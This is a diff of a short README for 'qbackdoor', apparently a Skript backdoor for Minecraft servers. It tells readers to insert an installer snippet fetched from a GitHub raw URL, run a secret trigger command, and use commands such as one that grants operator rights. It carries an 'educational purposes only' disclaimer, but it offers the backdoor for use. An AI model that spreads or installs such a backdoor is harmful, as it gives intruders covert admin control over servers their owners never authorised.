@@ -1,7 +1,9 @@
-## insert the [qbackdoor_installer_snippet.sk](https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_installer_snippet.sk) file to install the backdoor
-## run qIAmTheBackdoorOwner before saying u cant run commands
-## [sk utilities v 0.9.2](https://github.com/tim740/skUtilities/releases/tag/v0.9.2) is required  
-## this is for educational purposes only /!\\
+## qbackdoor is a backdoor skript file to backdoor minecraft servers
+## How to install:
+insert the [qbackdoor_installer_snippet.sk](https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_installer_snippet.sk) file to install the backdoor  
+run qIAmTheBackdoorOwner before saying u cant run commands  
+[sk utilities v 0.9.2](https://github.com/tim740/skUtilities/releases/tag/v0.9.2) is required    
+this is for educational purposes only /!\\
 ### commands:  
 qArgs - shows you how to pass arguments to commands  
 qOpMe - ops the user  
